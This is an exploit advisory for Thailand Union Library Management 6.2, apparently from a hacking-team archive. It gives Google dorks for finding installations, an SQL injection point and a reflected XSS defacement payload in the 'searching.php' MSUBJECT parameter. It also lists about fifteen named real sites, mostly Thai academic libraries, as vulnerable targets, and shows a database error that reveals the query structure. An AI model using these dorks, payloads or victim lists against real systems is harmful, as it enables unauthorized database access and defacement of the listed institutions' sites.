###################################################################

# Exploit Title : Thailand Union Library Management 6.2 Cross Site Scripting SQL Injection
# Author [ Discovered By ] : KingSkrupellos
# Team : Cyberizm Digital Security Army
# Date : 07/10/2019
# Vendor Homepage : ulibm.net - 202.29.234.1/ULIB/index.php
# Software Affected Versions : 6 and 6.2
# Tested On : Windows and Linux
# Category : WebApps
# Exploit Risk : Medium
# Google Dorks : 
inurl:/ULIB/about.php site:ac.th
inurl:/searching.php?SUBJECT= site:ac.th
ULIB inurl:/searching.php?SUBJECT= site:ac.th
# Vulnerability Type : CWE-89 [ Improper Neutralization of 
Special Elements used in an SQL Command ('SQL Injection') ]
CWE-79 [ Improper Neutralization of Input During 
Web Page Generation ('Cross-site Scripting') ]
# PacketStormSecurity : packetstormsecurity.com/files/authors/13968
# CXSecurity : cxsecurity.com/author/KingSkrupellos/1/
# Exploit4Arab : exploit4arab.org/author/351/KingSkrupellos

###################################################################

# Impact :
***********
Thailand Union Library Management 6.2 is prone to an SQL-injection 
vulnerability because it fails to sufficiently sanitize user-supplied data before using 
it in an SQL query. Exploiting this issue could allow an attacker to compromise the 
application, access or modify data, or exploit latent vulnerabilities in the underlying database. 
A remote attacker can send a specially crafted request to the vulnerable application and 
execute arbitrary SQL commands in application`s database. Further exploitation of this 
vulnerability may result in unauthorized data manipulation. 
An attacker can exploit this issue using a browser or with any SQL Injector Tool.

Reflected XSS (or Non-Persistent) :
***************************************
The server reads data directly from the HTTP request and reflects it back in the HTTP response. 
Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content
 to a vulnerable web application, which is then reflected back to the victim and executed by the 
web browser. The most common mechanism for delivering malicious content is to include 
it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. 
URLs constructed in this manner constitute the core of many phishing schemes, whereby 
an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects 
the attacker's content back to the victim,the content is executed by the victim's browser.

###################################################################

# SQL Injection Exploit :
**********************
/ULIB/searching.php?MSUBJECT=[SQL Injection]

/PATH-HERE/searching.php?MSUBJECT=[SQL Injection]

# Cross Site Scripting XSS Exploit :
********************************
/ULIB/searching.php?MSUBJECT=1%27%3Cmarquee%3E%3Cfont%20color=
lime%20size=32%3EHacked.By.KingSkrupellos%3C/font%3E%3C/marquee%3E

###################################################################

# Example Vulnerable Sites :
*************************
[+] 202.29.234.1/ULIB/searching.php?MSUBJECT=1%27

[+] 202.129.46.118/ULIB6NEW/searching.php?MSUBJECT=1%27

[+] 110.164.92.12/ULIB/searching.php?MSUBJECT=1%27

[+] pckpb.ac.th/ULIB6NEW/searching.php?MSUBJECT=1%27

[+] library.tni.ac.th/ulib/searching.php?MSUBJECT=1%27

[+] library.kku.ac.th/ulib/searching.php?MSUBJECT=1%27

[+] smnc.ac.th/ULIB6/searching.php?MSUBJECT=1%27

[+] library.phcsuphan.ac.th/searching.php?MSUBJECT=1%27

[+] lib.svit.ac.th/ULIB6/searching.php?MSUBJECT=1%27

[+] library.phcsuphan.ac.th/searching.php?MSUBJECT=1%27

[+] bcnlp.ac.th/ULIB6/searching.php?MSUBJECT=1%27

[+] ulibm.bcnsprnw.ac.th/ULIB6/searching.php?MSUBJECT=1%27

[+] library.cvc.ac.th/ulib/searching.php?MSUBJECT=1%27

[+] ulib.samakkhi.ac.th/ulib/searching.php?MSUBJECT=1%27

[+] ulib.bcnsurin.ac.th/ULIB/searching.php?MSUBJECT=1%27

###################################################################

# Example SQL Database Error :
****************************
mysqli: You have an error in your SQL syntax; check the manual that corresponds t
o your MySQL server version for the right syntax to use near ''1''' at line 1
select * from ignoreword where word='1'' 
select count(id) as tmpqcount FROM index_db where  
ispublish='yes' and 1     AnD   (  (subj like '%1'%' )    ) 
SELECT id,titl,auth,bibrating,mid,remoteindex FROM index_db where 
ispublish='yes' and 1     AnD   (  (subj like '%1'%' )   )   order by titl asc LIMIT 0,12

###################################################################

# Discovered By KingSkrupellos from Cyberizm.Org Digital Security Team 

###################################################################
